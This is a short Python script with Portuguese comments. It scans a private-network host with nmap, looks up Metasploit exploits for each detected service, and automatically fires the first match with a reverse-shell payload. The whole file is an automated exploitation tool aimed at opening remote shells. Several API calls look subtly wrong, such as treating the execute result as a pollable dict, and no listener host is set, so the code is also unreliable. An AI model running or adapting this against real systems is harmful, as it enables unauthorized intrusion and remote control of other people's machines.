import nmap
import msfrpc
import time

# Definindo o host alvo e as portas a serem verificadas
target_host = "192.168.0.1"
target_ports = "1-1000"

# Configurando a conexão com o Metasploit
client = msfrpc.Msfrpc({})
client.login('msf', 'msf')

# Configurando o objeto Nmap
nm = nmap.PortScanner()

# Executando a varredura com o Nmap
nm.scan(hosts=target_host, ports=target_ports, arguments='-sV -O')

# Iterando sobre os resultados da varredura do Nmap
for host in nm.all_hosts():
    if nm[host].state() == "up":
        print(f"[+] Host {host} está ativo")

        # Iterando sobre os serviços identificados pelo Nmap
        for port in nm[host]['tcp']:
            service = nm[host]['tcp'][port]['name']
            product = nm[host]['tcp'][port]['product']
            version = nm[host]['tcp'][port]['version']

            print(f"   [*] Porta {port} ({service}) está aberta")

            # Buscando exploits para os serviços identificados usando o Metasploit
            exploits = client.call('module.exploits', 'search', f"{service} {version}")

            if exploits:
                print(f"   [+] Vulnerabilidade encontrada para {service} {version}")

                # Executando o exploit usando o Metasploit
                exploit = exploits[0]['fullname']
                payload = 'generic/shell_reverse_tcp'
                options = {'RHOST': host, 'RPORT': port}

                exploit_job = client.call('module.execute', exploit, options, payload)
                print(f"   [+] Executando o exploit {exploit} para {service} {version}")

                # Aguardando a execução do exploit
                while exploit_job['busy']:
                    time.sleep(1)

                # Exibindo o resultado do exploit
                if exploit_job['job']['result'] == 'success':
                    print("   [+] Exploit executado com sucesso")
                    print(exploit_job['job']['data'])
                else:
                    print("   [-] Falha ao executar o exploit")

            else:
                print(f"   [-] Nenhuma vulnerabilidade encontrada para {service} {version}")

    else:
        print(f"[-] Host {host} está inativo")
